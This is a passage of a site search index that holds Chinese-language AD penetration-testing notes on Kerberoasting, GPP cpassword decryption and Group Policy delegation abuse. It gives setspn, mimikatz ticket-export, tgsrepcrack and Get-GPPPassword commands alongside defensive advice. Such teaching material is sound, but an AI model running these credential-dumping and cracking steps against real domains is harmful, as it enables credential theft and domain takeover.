servicename]\n\nserviceclass\uff1a\u670d\u52a1\u7ec4\u4ef6\u7684\u540d\u79f0\nhostname\uff1a\u4ee5\u201d/\u201d\u4e0e\u540e\u9762\u7684\u540d\u79f0\u5206\u9694\uff0c\u662f\u8ba1\u7b97\u673a\u7684FQDN(\u5168\u9650\u5b9a\u57df\u540d\uff0c\u540c\u65f6\u5e26\u6709\u8ba1\u7b97\u673a\u540d\u548c\u57df\u540d)\u3002\nport\uff1a\u4ee5\u5192\u53f7\u5206\u9694\uff0c\u540e\u9762\u7684\u5185\u5bb9\u4e3a\u8be5\u670d\u52a1\u76d1\u542c\u7684\u7aef\u53e3\u53f7\u3002\nservicename\uff1a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u662f\u670d\u52a1\u7684\u4e13\u6709\u540d\u79f0(DN)\u3001objectGuid\u3001Internet\u4e3b\u673a\u540d\u6216\u5168\u9650\u5b9a\u57df\u540d\u3002\n\n# MSSQL \u670d\u52a1\nMSSQLSvc/computer1.pentest.com:1443\n\n# Exchange \u670d\u52a1\nexchangeMDB/computer1.pentest.com\n\n# RDP\u670d\u52a1\nTERMSRV/EXCAS01.pentest.com\n\n# WSMan/WinRM/PSRemoting\u670d\u52a1\nWSMAN/EXCAS01.pentest.com\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#22-spn","title":"2.2 SPN \u67e5\u8be2","text":"<pre><code># \u67e5\u770b\u5f53\u524d\u57df\u5185\u6240\u6709\u7684SPN\nsetspn -q */*\n\n# \u5982\u679c\u5728\u57df\u6797\u4e2d\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u67e5\u770b\u6307\u5b9a\u57df test.lab \u5185\u7684 SPN\u3002\u5982\u679c\u6307\u5b9a\u57df\u4e0d\u5b58\u5728\uff0c\u5219\u9ed8\u8ba4\u5207\u6362\u5230\u67e5\u627e\u672c\u57df\u7684 SPN\nsetspn -T test.lab -q */*\n\n#\u5220\u9664\u6307\u5b9a SPN\uff1a\nsetspn -D MySQL/win7.xie.com:1433/MSSQL hack\n\n#\u67e5\u627e\u6307\u5b9a\u7528\u6237/\u4e3b\u673a\u540d\u6ce8\u518c\u7684 SPN\nsetspn -L username/hostname\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#23-powershell-spn","title":"2.3 Powershell \u4e0b\u7684 SPN \u626b\u63cf","text":"<p>https://github.com/PyroTek3/PowerShell-AD-Recon</p> <pre><code># \u626b\u63cf\u57df\u4e2d\u6240\u6709\u7684 MSSQL \u670d\u52a1\nImport-Module .\\Discover-PSMSSQLServers.ps1\nDiscover-PSMSSQLServers\n\n# \u626b\u63cf\u57df\u4e2d\u6240\u6709 SPN \u4fe1\u606f\nImport-Module .\\Discover-PSInterestingServices.ps1\nDiscover-PSInterestingServices\n\n#\u63a2\u6d4b\u57df\u5185\u6ce8\u518c\u7684 Exchannge \u670d\u52a1\u7684 SPN\nImport-Module .\\Discover-PSMSExchangeServers.ps1\nDiscover-PSMSExchangeServers\n</code></pre> <p>v</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#3spn-tgs-tickets","title":"3.SPN \u626b\u63cf\u548c\u7834\u89e3TGS Tickets","text":"<p>\u6ce8\uff1a\u57df\u5185\u7684\u4efb\u4f55\u4e00\u53f0\u4e3b\u673a\u7528\u6237\u6216\u666e\u901a\u57df\u7528\u6237\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7\u67e5\u8be2SPN\uff0c\u5411\u57df\u5185\u7684\u6240\u6709\u670d\u52a1\u8bf7\u6c42TGS\uff0c\u7136\u540e\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u4f46\u662f\u5bf9\u4e8e\u7834\u89e3\u51fa\u7684\u660e\u6587\uff0c\u53ea\u6709\u57df\u7528\u6237\u7684\u662f\u53ef\u4ee5\u5229\u7528\u7684\uff0c\u673a\u5668\u8d26\u6237\u7684\u4e0d\u80fd\u7528\u4e8e\u8fdc\u7a0b\u8fde\u63a5\uff0c\u6240\u4ee5\u6211\u4eec\u7684\u5173\u6ce8\u70b9\u4e3b\u8981\u5c31\u5728\u57df\u7528\u6237\u4e0b\u6ce8\u518c\u7684SPN\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#31-spn","title":"3.1 \u6ce8\u518c SPN","text":"<p>\u5728\u5ba2\u6237\u7aef\u4f7f\u7528 SPN \u5bf9\u670d\u52a1\u5b9e\u4f8b\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u4e4b\u524d\uff0c\u5fc5\u987b\u5728\u670d\u52a1\u5b9e\u4f8b\u4e0a\u5c06\u7528\u4e8e\u767b\u5f55\u7684\u7528\u6237\u6216\u8ba1\u7b97\u673a\u5e10\u6237\u6ce8\u518c SPN\u3002 \u901a\u5e38\uff0cSPN \u6ce8\u518c\u7531\u901a\u8fc7\u57df\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c\u7684\u670d\u52a1\u5b89\u88c5\u7a0b\u5e8f\u6765\u5b8c\u6210\u3002\u4f46\u662f\u6211\u4eec\u4e5f\u53ef\u4ee5\u624b\u52a8\u4f7f\u7528 Setspn.exe \u7a0b\u5e8f\u6765\u6ce8\u518c SPN\uff0csetspn.exe \u662f Windows \u81ea\u5e26\u7684\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8be5\u4e8c\u8fdb\u5236\u6587\u4ef6\u53ef\u4ee5\u7528\u4e8e SPN \u7684\u67e5\u770b\u3001\u6dfb\u52a0\u548c\u5220\u9664\u3002</p> <pre><code># \u624b\u52a8\u6ce8\u518c\n# \u4e3a SQL Server \u670d\u52a1\u5e10\u6237\u6ce8\u518c SPN\nsetspn -A MSSQLSvc/Win7.test.lab:1433 sqlsvc\n\n# \u67e5\u770b\u7528\u6237\u6240\u5bf9\u5e94\u7684 SPN \nsetspn.exe -L test.lab\\sqlsvc\n\n# SPN \u67e5\u8be2\u6240\u6709\u7968\u636e\nsetspn -q */* | findstr \"MSSQLSvc\"\n\n# \u5728 AD \u4e0a\u4e3a\u7528\u6237 sqlsvc \u6307\u5b9a\u670d\u52a1\u767b\u9646\u6743\u9650\u3002\ngpedit.msc -- \u8ba1\u7b97\u673a\u914d\u7f6e -- Windows \u8bbe\u7f6e -- \u5b89\u5168\u8bbe\u7f6e -- \u672c\u5730\u7b56\u7565 -- \u7528\u6237\u6743\u9650\u5206\u914d -- \u4f5c\u4e3a\u670d\u52a1\u767b\u5f55\uff1a\u6dfb\u52a0\u76f8\u5173\u7528\u6237\n\n# \u672c\u5730\u4fee\u6539\u9ed8\u8ba4 Kerberos \u4f1a\u8bdd\u5bc6\u94a5\u7c7b\u578b\u4e3a AES256_HMAC \u65e0\u6cd5\u901a\u8fc7tgsrepcrack.py \u7834\u89e3\uff0c\u9700\u8981\u5c06\u4f1a\u8bdd\u5bc6\u94a5\u6539\u6210 RC4_HMAC_MD5 \u624d\u80fd\u5229\u7528\u811a\u672c\u7834\u89e3\u3002\ngpedit.msc -- \u8ba1\u7b97\u673a\u914d\u7f6e -- Windows \u8bbe\u7f6e -- \u5b89\u5168\u8bbe\u7f6e -- \u672c\u5730\u7b56\u7565 -- \u5b89\u5168\u9009\u9879 -- \u7f51\u7edc\u5b89\u5168\uff1a\u914d\u7f6e Kerberos \u5141\u8bb8\u7684\u52a0\u5bc6\u7c7b\u578b\n</code></pre> <p></p> <p></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#32-spn-kerberos","title":"3.2 \u8bf7\u6c42 SPN Kerberos \u7968\u636e","text":"<pre><code>Add-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/Win7.test.lab:1433\"\n\n# \u67e5\u770b\u7f13\u5b58\u4e2d\u7684\u7968\u636e\nklist\n# \u5220\u9664\u7f13\u5b58\u7968\u636e\nklist purge\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#33-spn-kerberos","title":"3.3 \u5bfc\u51fa SPN Kerberos \u7968\u636e","text":"<pre><code># \u5728 mimikatz \u4e2d\u6267\u884c\uff1a\nkerberos::list /export\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#34-ntlm-hash","title":"3.4 \u5229\u7528\u811a\u672c\u79bb\u7ebf\u7834\u89e3\u7968\u636e\u4e2d\u6240\u5bf9\u5e94\u7684 NTLM Hash","text":"<p>https://github.com/nidem/kerberoast</p> <pre><code>python tgsrepcrack.py 1.txt \"1-40a10000-test01@MSSQLSvc~Win7.test.lab~1433-TEST.LAB.kirbi\"\n</code></pre> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article4/index.html#35-spn-kerberoast","title":"3.5 SPN \u4e2d\u7684 Kerberoast \u653b\u51fb\u9632\u8303","text":"<ul> <li>\u786e\u4fdd\u670d\u52a1\u8d26\u53f7\u5bc6\u7801\u4e3a\u5f3a\u5bc6\u7801(\u957f\u5ea6\u3001\u968f\u673a\u6027\u3001\u5b9a\u671f\u4fee\u6539)</li> <li>\u5982\u679c\u653b\u51fb\u8005\u65e0\u6cd5\u5c06\u9ed8\u8ba4\u7684AES256_HMAC\u52a0\u5bc6\u65b9\u5f0f\u6539\u4e3aRC4_HMAC_MD5\uff0c\u5c31\u65e0\u6cd5\u5b9e\u9a8ctgsrepcrack.py\u6765\u7834\u89e3\u5bc6\u7801\u3002</li> <li>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u55c5\u63a2\u7684\u65b9\u6cd5\u6293\u53d6Kerberos TGS\u7968\u636e\u3002\u56e0\u6b64\uff0c\u5982\u679c\u5f3a\u5236\u5b9e\u9a8cAES256_HMAC\u65b9\u5f0f\u5bf9Kerberos\u7968\u636e\u8fdb\u884c\u52a0\u5bc6\uff0c\u90a3\u4e48\uff0c\u5373\u4f7f\u653b\u51fb\u8005\u83b7\u53d6\u4e86Kerberos\u7968\u636e\uff0c\u4e5f\u65e0\u6cd5\u5c06\u5176\u7834\u89e3\uff0c\u4ece\u800c\u4fdd\u8bc1\u4e86\u6d3b\u52a8\u76ee\u5f55\u7684\u5b89\u5168\u6027\u3002</li> <li>\u8bb8\u591a\u670d\u52a1\u8d26\u6237\u5728\u5185\u7f51\u4e2d\u88ab\u5206\u914d\u4e86\u8fc7\u9ad8\u7684\u6743\u9650\uff0c\u4e14\u5bc6\u7801\u5f3a\u5ea6\u8f83\u5dee\u3002\u653b\u51fb\u8005\u5f88\u53ef\u80fd\u901a\u8fc7\u7834\u89e3\u7968\u636e\u7684\u5bc6\u7801\uff0c\u4ece\u57df\u7528\u6237\u6743\u9650\u63d0\u5347\u5230\u57df\u7ba1\u7406\u5458\u6743\u9650\u3002\u56e0\u6b64\uff0c\u5e94\u8be5\u5bf9\u670d\u52a1\u8d26\u6237\u7684\u6743\u9650\u8fdb\u884c\u9002\u5f53\u7684\u914d\u7f6e\uff0c\u5e76\u63d0\u9ad8\u5bc6\u7801\u7684\u5f3a\u5ea6\u3002</li> <li>\u5728\u8fdb\u884c\u65e5\u5fd7\u5ba1\u8ba1\u65f6\uff0c\u53ef\u4ee5\u91cd\u70b9\u5173\u6ce8ID\u4e3a4679(\u8bf7\u6c42Kerberos\u670d\u52a1\u7968\u636e)\u7684\u65f6\u95f4\u3002\u5982\u679c\u6709\u8fc7\u591a\u7684 4769 \u65e5\u5fd7\uff0c\u5e94\u8fdb\u4e00\u6b65\u68c0\u67e5\u7cfb\u7edf\u4e2d\u662f\u5426\u5b58\u5728\u6076\u610f\u884c\u4e3a\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article5/index.html","title":"\u57df\u4e2d\u7684\u7ec4\u7b56\u7565","text":"<p>\u7ec4\u7b56\u7565\u662f Windows \u73af\u5883\u4e0b\u7528\u6237\u7ba1\u7406\u5bf9\u8c61\u7684\u4e00\u79cd\u624b\u6bb5\uff0c\u5176\u5141\u8bb8\u7ba1\u7406\u5458\u901a\u8fc7\u7ec4\u7b56\u7565\u8bbe\u7f6e\u548c\u7ec4\u7b56\u7565\u9996\u9009\u9879\u4e3a\u7528\u6237\u548c\u8ba1\u7b97\u673a\u6307\u5b9a\u53d7\u7ba1\u7406\u914d\u7f6e\u7684\u57fa\u7840\u7ed3\u6784\u3002</p> <p>\u7ec4\u7b56\u7565\u5206\u4e3a\u672c\u5730\u7ec4\u7b56\u7565\u548c\u57df\u73af\u5883\u4e2d\u7684\u7ec4\u7b56\u7565\uff1a</p> <ul> <li>\u672c\u5730\u7ec4\u7b56\u7565\u9002\u5408\u4e8e\u7ba1\u7406\u72ec\u7acb\u672a\u52a0\u5165\u57df\u7684\u5de5\u4f5c\u7ec4\u7684\u673a\u5668\uff0c\u5176\u4ec5\u80fd\u5f71\u54cd\u5f53\u524d\u73af\u5883\u4e0b\u6b63\u5728\u4f7f\u7528\u7684\u8ba1\u7b97\u673a\uff1b</li> <li>\u57df\u73af\u5883\u4e2d\u7684\u7ec4\u7b56\u7565\u5219\u662f\u7528\u4e8e\u7ba1\u7406\u57df\u73af\u5883\u4e2d\u7684\u5404\u79cd\u5bf9\u8c61\uff0c\u5176\u53ef\u4ee5\u5f71\u54cd\u6240\u5173\u8054\u7684\u7ad9\u70b9(site)\u3001\u57df(domain)\u3001\u7ec4\u7ec7\u5355\u4f4d(OU)\uff1b</li> </ul> <p>\u57df\u73af\u5883\u4e2d\u901a\u8fc7\u914d\u7f6e\u7ec4\u7b56\u7565\u53ef\u4ee5\u5bf9\u57df\u4e2d\u7684\u7528\u6237\u3001\u7528\u6237\u7ec4\u3001\u8ba1\u7b97\u673a\u7b49\u5bf9\u8c61\u8fdb\u884c\u4e0d\u540c\u7ef4\u5ea6\u7684\u7ba1\u7406\uff1a\u5982\u5b89\u5168\u914d\u7f6e\u3001\u8f6f\u4ef6\u5b89\u88c5\u914d\u7f6e\u3001\u6ce8\u518c\u8868\u914d\u7f6e\u3001\u5f00\u5173\u673a\u4e0e\u767b\u5165\u767b\u51fa\u7ba1\u7406\u7b49\u3002\u914d\u7f6e\u7684\u7ec4\u7b56\u7565\u5bf9\u8c61\u901a\u8fc7\u5173\u8054\u5230\u7ad9\u70b9(site)\u3001\u57df(domain)\u3001\u7ec4\u7ec7\u5355\u4f4d(OU)\u4e0a\u6765\u5728\u4e0d\u540c\u5c42\u7ea7\u5e94\u7528\u4e0d\u540c\u7684\u7ec4\u7b56\u7565\u914d\u7f6e\u3002</p> <p>\u5728\u4f01\u4e1a\u4e2d\uff0c\u57df\u7ba1\u7406\u5458\u901a\u8fc7\u7ec4\u7b56\u7565\u7ba1\u7406\u63a7\u5236\u53f0(GPMC\uff0cGroup Policy Managment Console)\u8fdb\u884c\u7ec4\u7b56\u7565\u7684\u7f16\u8f91\u548c\u5e94\u7528\uff0c\u4ee5\u6b64\u5229\u7528\u7ec4\u7b56\u7565\u7ba1\u7406\u6574\u4e2a\u57df\u3002\u53ef\u4ee5\u7b80\u5355\u7684\u628aGPMC \u5f53\u6210\u4f01\u4e1a\u7ba1\u7406\u7684\u795e\u7ecf\u4e2d\u67a2\uff0c\u800c\u5176\u4e2d\u7684\u6bcf\u4e00\u6761\u7ec4\u7b56\u7565\u5219\u662f\u795e\u7ecf\u4e2d\u67a2\u7684\u6bcf\u4e00\u6761\u795e\u7ecf\uff0c\u6b63\u662f\u901a\u8fc7\u6bcf\u4e00\u6761\u7ec4\u7b56\u7565\u624d\u4f7f\u5f97\u6574\u4e2a\u4f01\u4e1a\u57df\u73af\u5883\u4e95\u4e95\u6709\u6761\u7684\u8fd0\u884c\u7740\u3002</p> <p>\u7ec4\u7b56\u7565\u5185\u5305\u542b \u8ba1\u7b97\u673a\u914d\u7f6e \u548c \u7528\u6237\u914d\u7f6e \u4e24\u90e8\u5206\uff1a</p> <ul> <li>\u8ba1\u7b97\u673a\u914d\u7f6e\uff1a\u5176\u4f4d\u4e8e\u201c\u7ec4\u7b56\u7565\u7ba1\u7406\u7f16\u8f91\u5668\u201d\u4e2d\u7684\u201c\u8ba1\u7b97\u673a\u914d\u7f6e\u201d\u4e0b\uff0c\u5f53\u8ba1\u7b97\u673a\u5f00\u673a\u65f6\uff0c\u7cfb\u7edf\u4f1a\u6839\u636e\u8ba1\u7b97\u673a\u914d\u7f6e\u7684\u7ec4\u7b56\u7565\u5185\u5bb9\u6765\u8bbe\u7f6e\u8ba1\u7b97\u673a\u7684\u73af\u5883\u3002\u65e0\u8bba\u54ea\u4e2a\u7528\u6237\u767b\u5f55\u5230\u8ba1\u7b97\u673a\uff0c\u8be5\u8ba1\u7b97\u673a\u90fd\u4f1a\u5e94\u7528\u7ec4\u7b56\u7565\u7684\u8ba1\u7b97\u673a\u914d\u7f6e\u3002\u4f8b\u5982\u5728\u57df\u4e2d\u914d\u7f6e\u4e86\u7ec4\u7b56\u7565\uff0c\u5219\u8fd9\u4e2a\u7ec4\u7b56\u7565\u4e2d\u7684\u8ba1\u7b97\u673a\u8bbe\u7f6e\u5c31\u4f1a\u88ab\u5e94\u7528\u5230\u8fd9\u4e2a\u57df\u5185\u7684\u6240\u6709\u8ba1\u7b97\u673a\u4e0a\u3002</li> <li>\u7528\u6237\u914d\u7f6e\uff1a\u5176\u4f4d\u4e8e\u201c\u7ec4\u7b56\u7565\u7ba1\u7406\u7f16\u8f91\u5668\u201d\u4e2d\u7684\u201c\u7528\u6237\u914d\u7f6e\u201d\u4e0b\uff0c\u5f53\u7528\u6237\u767b\u5f55\u65f6\uff0c\u7cfb\u7edf\u4f1a\u6839\u636e\u7528\u6237\u914d\u7f6e\u7684\u7ec4\u7b56\u7565\u5185\u5bb9\u6765\u8bbe\u7f6e\u7528\u6237\u7684\u5de5\u4f5c\u73af\u5883\u3002\u65e0\u8bba\u8be5\u7528\u6237\u767b\u5f55\u5230\u54ea\u4e00\u53f0\u8ba1\u7b97\u673a\uff0c\u90fd\u4f1a\u5e94\u7528\u7ec4\u7b56\u7565\u7684\u8be5\u7528\u6237\u914d\u7f6e\u3002\u4f8b\u5982\u5728\u7ec4\u7ec7\u5355\u4f4d OU\u6280\u672f\u90e8\u914d\u7f6e\u4e86\u7ec4\u7b56\u7565\uff0c\u5219\u8fd9\u4e2a\u7ec4\u7b56\u7565\u4e2d\u7684\u7528\u6237\u914d\u7f6e\u5c31\u4f1a\u88ab\u5e94\u7528\u5230\u8fd9\u4e2a\u6280\u672f\u90e8\u7ec4\u7ec7\u5355\u4f4d OU \u5185\u7684\u6240\u6709\u7528\u6237\u7684\u5de5\u4f5c\u73af\u5883\u673a\u5668\u4e0a\u3002</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u5728\u7ec4\u7b56\u7565\u7ba1\u7406\u7f16\u8f91\u5668\u53ef\u4ee5\u770b\u5230\u8ba1\u7b97\u673a\u914d\u7f6e\u548c\u7528\u6237\u914d\u7f6e</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article5/index.html#_2","title":"\u7ec4\u7b56\u7565\u7684\u5b89\u5168\u95ee\u9898","text":"<p>\u7ec4\u7b56\u7565\u62e5\u6709\u8fd9\u4e48\u5f3a\u5927\u7684\u529f\u80fd\uff0c\u56e0\u6b64\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u4f7f\u7528\u4e0d\u5f53\u6216\u88ab\u653b\u51fb\u8005\u6076\u610f\u6ee5\u7528\uff0c\u4f1a\u5b58\u5728\u4e25\u91cd\u7684\u5b89\u5168\u95ee\u9898\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article5/index.html#1-gpp","title":"1. \u7ec4\u7b56\u7565\u9996\u9009\u9879 GPP \u63d0\u6743","text":"<p>\u524d\u9762\u6211\u4eec\u8bb2\u5230\u4e86\u7ec4\u7b56\u7565\u6a21\u677f GPT \u7684\u5b58\u50a8\u4f4d\u7f6e\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684 <code>%systemroot%\\sysvol\\sysvol\\\u57df\u540d\\Policies</code> \u6587\u4ef6\u5939\u5185\uff0c\u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u8bbf\u95ee\u8be5\u6587\u4ef6\u5939\u3002</p> <p></p> <p>\u57df\u7ba1\u7406\u5458\u901a\u8fc7\u7ec4\u7b56\u7565\u7edf\u4e00\u4fee\u6539\u540e\u7684\u5bc6\u7801\u867d\u7136\u5f3a\u5ea6\u6709\u6240\u63d0\u9ad8\uff0c\u4f46\u8be5\u4fee\u6539\u540e\u7684\u5bc6\u7801\u4f1a\u4f7f\u7528 AES-256 \u52a0\u5bc6\u7b97\u6cd5\u4fdd\u5b58\u5728 SYSVOL \u5171\u4eab\u76ee\u5f55\u4e2d\u7684 XML \u6587\u4ef6\u5185\u3002\u672c\u6765 AES-256 \u52a0\u5bc6\u7b97\u6cd5\u5b89\u5168\u6027\u662f\u8f83\u9ad8\u7684\uff0c\u4f46\u662f 2012 \u5e74\u5fae\u8f6f\u5728\u5b98\u65b9\u7f51\u7ad9\u4e0a\u516c\u5e03\u4e86\u8be5\u5bc6\u7801\u7684\u79c1\u94a5\uff0c\u5bfc\u81f4\u4fdd\u5b58\u5728 XML \u6587\u4ef6\u4e2d\u7684\u5bc6\u7801\u53ef\u4ee5\u88ab\u89e3\u5bc6\u3002\u4efb\u4f55\u6709\u6548\u57df\u7528\u6237\u5747\u53ef\u5bf9\u8be5\u5171\u4eab\u76ee\u5f55\u8fdb\u884c\u8bbf\u95ee\uff0c\u8fd9\u5c31\u610f\u5473\u7740\uff0c\u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u8bbf\u95ee\u4fdd\u5b58\u5728 XML \u6587\u4ef6\u4e2d\u7684\u5bc6\u7801\u5e76\u5c06\u5176\u89e3\u5bc6\uff0c\u4ece\u800c\u63a7\u5236\u57df\u4e2d\u6240\u6709\u4f7f\u7528\u8be5\u5bc6\u7801\u7684\u8ba1\u7b97\u673a\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article5/index.html#1-gpp_1","title":"(1) \u7ec4\u7b56\u7565\u9996\u9009\u9879 GPP \u63d0\u6743\u590d\u73b0","text":"<p>\u9996\u5148\uff0c\u6211\u4eec\u9488\u5bf9\u57df xie.com \u65b0\u5efa\u4e00\u4e2a\u540d\u4e3a Gpp_test \u7684\u7ec4\u7b56\u7565\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u7136\u540e\u5bf9\u8be5\u7ec4\u7b56\u7565\u8fdb\u884c\u7f16\u8f91\uff0c\u5982\u56fe\u6240\u793a\uff0c\u70b9\u51fb\u8ba1\u7b97\u673a\u914d\u7f6e\u2014\u2014&gt;\u9996\u9009\u9879\u2014\u2014&gt;\u63a7\u5236\u9762\u677f\u8bbe\u7f6e\u2014\u2014&gt;\u672c\u5730\u7528\u6237\u548c\u7ec4\u3002</p> <p></p> <p>\u7136\u540e\u53f3\u952e\u672c\u5730\u7528\u6237\u548c\u7ec4\u2014\u2014&gt;\u65b0\u5efa\u2014\u2014&gt;\u672c\u5730\u7528\u6237\uff0c\u6211\u4eec\u5c06\u57df\u4e2d\u6bcf\u4e2a\u8ba1\u7b97\u673a\u7684\u672c\u5730administrator \u7528\u6237\u66f4\u540d\u4e3a admin\uff0c\u5e76\u4e14\u8bbe\u7f6e\u65b0\u7684\u5bc6\u7801 root@123456\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u7b49\u5f85\u7ec4\u7b56\u7565\u5e94\u7528\u5b8c\u6210\u5373\u53ef\u3002\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5728\u5982\u4e0b\u76ee\u5f55\u4e0b\u627e\u5230 Groups.xml \u6587\u4ef6\u3002</p> <pre><code>\\\\xie.com\\sysvol\\xie.com\\Policies\\{\u65b0\u5efa\u7ec4\u7b56\u7565\u7684 GUID}\\Machine\\Preferences\\Groups\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u627e\u5230 Groups.xml \u6587\u4ef6\u3002</p> <p></p> <p>\u67e5\u770b Groups.xml \u6587\u4ef6\u5185\u5bb9\uff0c\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u521a\u521a\u901a\u8fc7\u7ec4\u7b56\u7565\u8bbe\u7f6e\u7684\u4e00\u4e9b\u503c\u3002\u5176\u4e2d\u53ef\u4ee5\u770b\u5230 cpassword \u5b57\u6bb5\uff0c\u8be5\u5b57\u6bb5\u7684\u503c\u5c31\u662f\u6211\u4eec\u4fee\u6539\u540e\u7684\u5bc6\u7801\u7ecf\u8fc7AES-256 \u8fdb\u884c\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u3002\u7531\u4e8e\u5fae\u8f6f\u5728 2012 \u5e74\u516c\u5e03\u4e86\u8be5\u5bc6\u7801\u7684\u79c1\u94a5\uff0c\u5bfc\u81f4\u8be5\u5b57\u6bb5\u7684\u5bc6\u6587\u80fd\u88ab\u89e3\u5bc6\u6210\u660e\u6587\u3002</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u4ee5\u57df\u666e\u901a\u7528\u6237\u8eab\u4efd\u767b\u5f55\u57df\u5185\u4efb\u610f\u4e00\u53f0\u673a\u5668\uff0c\u4f7f\u7528 PowerSploit \u4e2d\u7684 <code>Get- GPPPassword.ps1</code> \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5c06\u7ec4\u7b56\u7565\u4e2d\u7684\u5bc6\u6587\u89e3\u5bc6\u6210\u660e\u6587\u3002</p> <pre><code>Import-Module .\\Get-GPPPassword.ps1\nGet-GPPPassword\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 Get-GPPPassword.ps1 \u811a\u672c\u6210\u529f\u83b7\u5f97\u5bc6\u7801\u660e\u6587\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article5/index.html#2","title":"(2) \u9488\u5bf9\u7ec4\u7b56\u7565\u9996\u9009\u9879\u63d0\u6743\u7684\u9632\u5fa1\u63aa\u65bd","text":"<p>\u5728\u7528\u4e8e\u7ba1\u7406\u7ec4\u7b56\u7565\u7684\u8ba1\u7b97\u673a\u4e0a\u5b89\u88c5 <code>KB2962486</code>\u8865\u4e01\uff0c\u9632\u6b62\u65b0\u7684\u51ed\u636e\u88ab\u653e\u7f6e\u5728\u7ec4\u7b56\u7565\u9996\u9009\u9879\u4e2d\u3002\u5fae\u8f6f\u5728 2014 \u5e74 5 \u6708 13 \u65e5\u53d1\u5e03\u4e86\u9488\u5bf9 GPP \u7ec4\u7b56\u7565\u9996\u9009\u9879\u63d0\u6743\u6f0f\u6d1e\u7684\u66f4\u65b0\u8865\u4e01<code>KB2928120</code>\uff0c\u8865\u4e01\u66f4\u65b0\u540e\u4f7f\u7528\u7684\u65b9\u6cd5\u5c31\u662f\u4e0d\u518d\u5c06\u5bc6\u7801\u4fdd\u5b58\u5728\u7ec4\u7b56\u7565\u9996\u9009\u9879\u4e2d\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Basic_knowledge_of_the_domain/article5/index.html#2_1","title":"2. \u6ee5\u7528\u7ec4\u7b56\u7565\u59d4\u6d3e\u5c5e\u6027","text":"<p>\u6211\u4eec\u5728\u67e5\u770b\u7ec4\u7b56\u7565\u59d4\u6d3e\u5c5e\u6027\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u770b\u5230\u54ea\u4e9b\u7528\u6237\u548c\u7ec4\u5bf9\u5176\u6709\u6743\u9650\u7f16\u8f91\u3001\u5220\u9664\u548c\u4fee\u6539\u3002\u5982\u679c\u653b\u51fb\u8005\u5728\u83b7\u5f97\u9ad8\u6743\u9650\u7684\u65f6\u5019\uff0c\u5c06\u7ec4\u7b56\u7565\u5bf9\u8c61\u7684\u5b8c\u6574\u6743\u9650\u8d4b\u4e88\u7ed9\u67d0\u4e2a\u6076\u610f\u7528\u6237\u7684\u8bdd\uff0c\u5219\u8be5\u6076\u610f\u7528\u6237\u540e\u7eed\u53ef\u4ee5\u4fee\u6539\u8be5\u7ec4\u7b56\u7565\u5bf9\u8c61\u7684\u914d\u7f6e\uff0c\u4ee5\u8fbe\u5230\u653b\u51fb\u53d7\u6b64\u7ec4\u7b56\u7565\u5f71\u54cd\u7684\u8ba1\u7b97\u673a\u548c\u7528\u6237\u7684\u76ee\u7684\u3002\u56e0\u6b64\uff0c\u8be5\u653b\u51fb\u624b\u6cd5\u901a\u5e38\u88ab\u653b\u51fb\u8005\u7528\u6765\u540e\u6743\u9650\u7ef4\u6301\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u8d4b\u4e88\u7ed9\u4e86\u666e\u901a\u57df\u7528\u6237 hack \u7f16\u8f91\u3001\u5220\u9664\u3001\u4fee\u6539\u7ec4\u7b56\u7565 test \u7684\u6743\u9650\u3002\u5982\u679c hack \u7528\u6237\u88ab\u653b\u51fb\u8005\u638c\u63e1\uff0c\u5219\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 hack \u7528\u6237\u5bf9\u8be5 test 